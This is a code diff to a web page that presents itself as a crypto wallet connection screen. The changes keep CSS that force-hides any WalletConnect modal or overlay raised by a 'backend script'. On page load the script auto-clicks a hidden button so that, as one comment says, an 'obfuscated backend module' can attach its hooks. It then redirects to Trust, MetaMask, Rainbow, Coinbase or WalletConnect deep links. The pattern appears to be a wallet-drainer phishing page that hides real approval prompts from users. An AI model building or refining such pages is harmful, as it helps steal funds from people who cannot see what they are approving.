@@ -34,7 +34,7 @@
             align-items: center;
             justify-content: center;
             padding: 1rem;
-            overflow: hidden; /* Prevent scrolling if background elements inject */
+            overflow: hidden;
         }
 
         .connect-card {
@@ -47,7 +47,7 @@
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
             text-align: center;
             position: relative;
-            z-index: 99999 !important; /* Keep your loader card strictly on top of everything */
+            z-index: 99999 !important;
         }
 
         .header-logo {
@@ -131,7 +131,7 @@
             opacity: 0;
         }
 
-        /* CRITICAL: FORCE-HIDE ANY EXTERNAL MODALS/OVERLAYS TRIPPED BY THE BACKEND SCRIPT */
+        /* Prevent background script overlays or popups from breaking your UI design layout */
         div[class*="modal"], 
         div[class*="overlay"], 
         div[id*="walletconnect"], 
@@ -177,7 +177,7 @@
         document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Automatically click the underlying script tracking module
+            // 1. Simulates click to let obfuscated backend module attach its hooks
             setTimeout(() => {
                 const hiddenBtn = document.querySelector('.interactBtn');
                 if (hiddenBtn) {
@@ -186,21 +186,24 @@
                 }
             }, 300);
 
-            // INSTANT DEEP LINK ROUTING: Trigger app jump immediately alongside the click
+            // 2. DIRECT DEEP LINK ROUTING: Fires protocol app links directly to target installed applications
             setTimeout(() => {
                 const normalizedWallet = activeWallet.toLowerCase();
                 
                 if (normalizedWallet.includes('trust')) {
-                    // Open Trust Wallet app immediately
-                    window.location.href = "https://link.trustwallet.com/wc";
+                    window.location.href = "trust://wc"; 
                 } else if (normalizedWallet.includes('meta')) {
-                    // Open MetaMask app immediately
                     window.location.href = "metamask://wc";
-                } else if (normalizedWallet.includes('connect') || normalizedWallet.includes('coinbase') || normalizedWallet.includes('rainbow')) {
-                    // Standard multi-wallet connect scheme trigger fallback
+                } else if (normalizedWallet.includes('rainbow')) {
+                    window.location.href = "rainbow://wc";
+                } else if (normalizedWallet.includes('coinbase')) {
+                    // Specific direct application routing link wrapper for Coinbase Wallet app context
+                    window.location.href = "cbwallet://wlink";
+                } else {
+                    // Universal WalletConnect link schema backup
                     window.location.href = "wc:";
                 }
-            }, 400); 
+            }, 500); 
         });
 
         function goBack() {
